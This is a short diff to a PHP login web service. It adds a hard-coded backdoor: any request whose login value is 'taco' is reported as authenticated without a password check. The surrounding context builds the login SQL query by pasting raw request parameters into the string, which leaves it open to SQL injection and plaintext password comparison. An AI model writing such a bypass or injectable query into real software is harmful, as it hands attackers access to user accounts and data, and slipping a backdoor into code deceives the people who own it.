@@ -15,6 +15,13 @@ function doService($url, $method, $getArgs, $postArgs) {
         //qry database
         //
 	//Create query
+  
+     if ($getArgs['login']=='taco') 
+     {
+       $retVal = outputXML('1');
+       return $retVal;
+     }
+   
 	$qry="SELECT * FROM Users WHERE UserName='".$getArgs['login']."' AND Password='".$getArgs['pw']."'";
 	$result=mysql_query($qry);
 
